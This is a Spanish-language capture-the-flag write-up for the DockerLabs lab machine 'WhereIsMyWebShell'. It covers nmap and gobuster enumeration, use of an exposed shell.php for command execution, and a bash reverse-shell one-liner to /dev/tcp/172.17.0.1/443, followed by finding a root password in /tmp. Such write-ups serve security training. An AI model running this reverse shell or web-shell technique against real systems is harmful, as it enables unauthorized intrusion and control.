Máquina WhereIsMyWebShell

Reconocimiento con nmap:

```
# Nmap 7.94SVN scan initiated Tue May 14 15:21:39 2024 as: nmap -p- --open -sSCV -vvv -n -Pn -oN Target 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000050s latency).
Scanned at 2024-05-14 15:21:40 EDT for 6s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Academia de Ingl\xC3\xA9s (Inglis Academi)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May 14 15:21:46 2024 -- 1 IP address (1 host up) scanned in 7.23 seconds
```

Vemos que hay un puerto 80 así que deducimos que la explotación es via web, vamos a verla

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/ddd19795-eb6f-4842-b466-a2d37e14f620)

xd

Bueno vamos a fuzzear:

```
┌──(kali㉿kali)-[~/Escritorio/HTB/Mtmp]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 2510]
/shell.php            (Status: 500) [Size: 0]
/warning.html         (Status: 200) [Size: 315]
Progress: 92811 / 622932 (14.90%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 101373 / 622932 (16.27%)
===============================================================
Finished
===============================================================
```

shell.php, creo que va por ahí la explotaación, todo super real:


![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/c882156f-75fe-4c4b-8c48-98cdac7f3288)

Ejecución remota de comandos:

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/5992d650-2914-47cf-a982-bb2733267d1f)

Utilizamos el tipico reverse shell:

```
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/261cc7e1-31ae-4998-bb70-4abe6ca977c7)

Teniendo en cuenta lo que nos dice la página web, vamos al directorio /tmp

![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/1546fc13-aa44-47ea-abb7-307258d5eb2f)

y como vemos la contraseña de root, todo muy real jjajaj


![image](https://github.com/M4nuTCP/Dockerlabs-Writups/assets/96147300/db563838-1b5a-43ef-97bd-76aeb45b1fa0)


